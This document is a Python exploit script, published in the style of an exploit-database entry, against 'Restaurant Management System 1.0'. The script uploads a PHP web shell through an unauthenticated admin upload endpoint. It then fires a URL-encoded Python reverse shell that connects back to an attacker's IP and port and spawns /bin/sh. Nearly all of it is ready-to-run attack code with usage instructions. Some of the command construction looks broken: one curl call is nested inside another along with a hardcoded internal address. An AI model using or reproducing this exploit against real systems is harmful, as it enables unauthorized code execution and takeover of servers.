# Exploit Title: Restaurant Management System 1.0  - Remote Code Execution
# Date: 2019-10-16
# Exploit Author: Ibad Shah
# Vendor Homepage: https://www.sourcecodester.com/users/lewa
# Software Link: https://www.sourcecodester.com/php/11815/restaurant-management-system.html
# Version: N/A
# Tested on: Apache 2.4.41

#!/usr/bin/python

import requests
import sys

print("\n\t\t>>>- cOdEd By: Venexy | Telegram: @MaxiiKimii -<<<\n")
if len(sys.argv) != 4:
    print("[+] Usage : python exploit.py http://target.com/ <ip> <port>")
    exit()

url = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]

if len(sys.argv[1]) < 8:
    print("[+] Usage : python exploit.py http://target.com/")
    exit()

print("[+] Restaurant Management System Exploit, Uploading Shell")

target = url + "admin/foods-exec.php"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "327",
    "Content-Type": "multipart/form-data;boundary=---------------------------191691572411478",
    "Connection": "close",
    "Referer": "http://localhost:8081/rms/admin/foods.php",
    "Cookie": "PHPSESSID=4dmIn4q1pvs4b79",
    "Upgrade-Insecure-Requests": "1"
}

# Full PHP reverse shell code
#php_reverse_shell = f"""
#<?php echo shell_exec($_GET["cmd"]); ?>
#"""
#print(php_reverse_shell)

data = """
-----------------------------191691572411478
Content-Disposition: form-data; name="photo"; filename="exploit.php"
Content-Type: text/html

<?php echo shell_exec($_GET["cmd"]); ?>
-----------------------------191691572411478
Content-Disposition: form-data; name="Submit"

Add
-----------------------------191691572411478--
"""

r = requests.post(target, verify=False, headers=headers, data=data)

print("[+] Shell Uploaded. Please check the URL: " + url + "images/exploit.php")

            
import subprocess

# Start the reverse listener using ncat
#reverse_listener_command = f"ncat -lvp {port}"
#listener_process = subprocess.Popen(reverse_listener_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Wait for a moment to ensure the listener is ready
print(f"[+] Make sure Listener is running on {port}!")
import time 
time.sleep(2)

print("[+] Executing Shell on Target System...")
py_reverse_shell = f"""curl -s 'http://10.10.63.14:12340/rms/images/exploit.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect(("{ip}"%2C{port}))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn("/bin/sh")%27'

"""

execute_shell_command = f"curl -s {url}images/exploit.php?cmd={py_reverse_shell}"
#print(execute_shell_command)
execute_shell_process = subprocess.Popen(execute_shell_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
execute_shell_process.communicate()


#print("[+] Reverse listener started. Waiting for the shell connection...")
print("[!] Shell executed on the target, Check your Listener!")
print(f"[+] For RCE: {url}images/exploit.php?cmd=whoami")
# Now, execute the PHP reverse shell on the target
#execute_shell_command = f"curl -s {url}images/exploit.php"
#execute_shell_process = subprocess.Popen(execute_shell_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#execute_shell_process.communicate()



# Wait for the listener process to finish
#listener_process.wait()

# Close the listener
#listener_process.terminate()
